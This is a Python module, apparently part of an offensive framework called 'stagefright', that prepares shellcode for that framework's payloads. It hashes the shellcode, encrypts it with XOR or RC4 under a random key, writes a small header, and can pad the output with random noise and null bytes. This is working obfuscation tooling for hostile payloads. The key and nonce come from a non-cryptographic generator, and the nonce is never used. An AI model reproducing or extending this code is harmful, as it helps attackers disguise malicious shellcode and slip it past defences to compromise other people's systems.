#pylint: disable=too-few-public-methods
"""
    Transform shellcode to a way digestable by payloads of stagefright

    0        16        20          24             28              32
    |   MD5  |  Type   |  Key Size |  Nonce Size  |  Payload Size |  Key | Nonce | Payload |

"""
import os
import random
import string
import hashlib
from enum import Enum
from typing import Any

from .consts import INFLATE_SIZE


class EncAlgo(Enum):
    """Enum to store Encryption type"""
    XOR = 0
    RC4 = 1

class Hasher:
    """Class to store Hash related info"""
    hasher: Any = None
    digest: str = ''

    def md5(self, payload: list) -> str:
        """MD5 hash incoming payload"""
        self.hasher = hashlib.md5(bytes(payload))
        self.digest = self.hasher.hexdigest()
        return self.digest

class ByteCreator:
    """Base class for byte manipulation"""
    payload_str: str = ''
    payload_bytes: bytes = b''
    payload_len: int = 0

    def generate_random_bytes(self, b_size=16):
        """Generate random bytes"""
        self.payload_str = ''.join(random.choices(string.ascii_letters + string.digits, k=b_size))
        self.payload_bytes = self.payload_str.encode('utf-8')
        self.payload_len = len(self.payload_str)

class Mutator:
    """Class responsible for mutating shellcode in a way that is a injestable by modules"""
    def __init__(self, payload: list):
        self.inflate = False
        self.algo: EncAlgo | None = None
        self.payload: list = payload.copy()
        self.hasher: Hasher = Hasher()
        self.key: ByteCreator = ByteCreator()
        self.nonce: ByteCreator = ByteCreator()

    def _hash_payload(self):
        """MD5 Hash payload"""
        self.hasher.md5(self.payload)

    def _gen_keys(self, keysize=random.randint(16,32)):
        """Generate Keys"""
        self.key.generate_random_bytes(keysize)

    def _gen_nonce(self, noncesize=random.randint(16,32)):
        self.nonce.generate_random_bytes(noncesize)

    def randomize(self):
        """Randomize Options"""
        self.algo = random.choice(list(EncAlgo))
        self.inflate = bool(random.getrandbits(1))

    def xor_encrypt(self):
        """XOR Encrypt bytes"""
        key_bytes = self.key.payload_bytes
        encrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(self.payload)])
        return encrypted

    def rc4_encrypt(self):
        """RC4 encrypt bytes"""
        key = self.key.payload_bytes
        # Key-scheduling algorithm (KSA)
        s = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s[i] + key[i % len(key)]) % 256
            s[i], s[j] = s[j], s[i]

        # Pseudo-random generation algorithm (PRGA)
        i = 0
        j = 0
        result = bytearray()
        for byte in self.payload:
            i = (i + 1) % 256
            j = (j + s[i]) % 256
            s[i], s[j] = s[j], s[i]
            k = s[(s[i] + s[j]) % 256]
            result.append(byte ^ k)
        return bytes(result)

    def generate(self, logger) -> bytes:
        """Prepapre shellcode"""
        if not self.hasher.hasher:
            self._hash_payload()
        if self.key.payload_len == 0:
            self._gen_keys()
        if self.nonce.payload_len == 0:
            self._gen_nonce()

        if not self.algo:
            self.algo = random.choice(list(EncAlgo))

        output: bytes = self.hasher.hasher.digest()
        output += self.algo.value.to_bytes(4, byteorder="little")
        output += self.key.payload_len.to_bytes(4, byteorder="little")
        output += self.nonce.payload_len.to_bytes(4, byteorder="little")
        output += len(self.payload).to_bytes(4, byteorder="little")
        output += self.key.payload_bytes
        output += self.nonce.payload_bytes
        output += self.rc4_encrypt() if self.algo == EncAlgo.RC4 else self.xor_encrypt()

        if self.inflate:
            tgt_size = INFLATE_SIZE - len(output)
            noise_size = int(0.4*tgt_size)
            null_size = tgt_size - noise_size

            # generate noise
            output += os.urandom(noise_size)

            # generate null
            output += b'\x00'*null_size
        logger.debug(
            "Payload Hash: %s | Algo: %s | Key: %s (%d bytes) | Nonce: %s (%d bytes) | Inflate: %s",
            self.hasher.digest, self.algo.name,
            self.key.payload_str, self.key.payload_len,
            self.nonce.payload_str, self.nonce.payload_len,
            self.inflate
        )
        return output
